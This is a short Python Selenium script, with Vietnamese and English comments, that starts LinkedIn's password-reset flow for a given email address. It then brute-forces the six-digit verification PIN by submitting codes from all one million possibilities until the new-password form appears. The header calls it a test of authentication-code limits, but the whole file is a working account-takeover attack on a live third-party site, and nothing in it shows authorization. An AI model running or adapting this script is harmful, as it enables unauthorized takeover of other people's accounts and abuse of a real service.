#Kiểm tra giới hạn mã Authentication

from selenium import webdriver
from selenium.webdriver.common.by import By
import time, os
import random
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC


url = "https://www.linkedin.com"
username = "abc@gmail.com"


# For the sake of an example i suppose that the reset codes of the webiste are just 6 digit numbers random
# Để làm ví dụ, tôi cho rằng mã đặt lại của trang web chỉ là các số có 6 chữ số ngẫu nhiên
verificationCodes = ['%06d' % i for i in range(1000000)]

browser = webdriver.Chrome()
browser.get(url)
foget = WebDriverWait(browser,10).until(EC.presence_of_element_located((By.LINK_TEXT,'Forgot password?')))
foget.click()
userId = WebDriverWait(browser,10).until(EC.presence_of_element_located((By.XPATH,'//*[@id="username"]')))
userId.clear()
userId.send_keys(username)
sendCodeButton = WebDriverWait(browser,10).until(EC.presence_of_element_located((By.XPATH,'//*[@id="reset-password-submit-button"]')))
sendCodeButton.click()
time.sleep(20)
foundCode = False

while not foundCode:
    try:
        random.shuffle(verificationCodes)
        code = verificationCodes[-1]
        print('Trying', code)
        emailCode = WebDriverWait(browser,10).until(EC.presence_of_element_located((By.XPATH, '//*[@id="input__email_verification_pin"]')))
        emailCode.clear()
        emailCode.send_keys(code)
        verifyCodeButton = WebDriverWait(browser,10).until(EC.presence_of_element_located((By.XPATH, '//*[@id="pin-submit-button"]')))
        verifyCodeButton.click()
        time.sleep(3)
        try:
            WebDriverWait(browser,10).until(EC.presence_of_element_located((By.XPATH, '//*[@id="newPassword"]')))
            print('Found code', code)
            foundCode = True
        except:
            #This lines of code is executed when the captcha entered is incorrect, and it is done to ensure that the same captcha is not retried.
            #Những dòng mã này được thực thi khi mã xác nhận nhập vào không chính xác, và nó được thực hiện để đảm bảo rằng cùng một mã xác nhận không được thử lại.
            verificationCodes.pop() 
            print('%d codes left' % len(verificationCodes))
            pass
    except Exception as e:
        print(e)
        time.sleep(5)
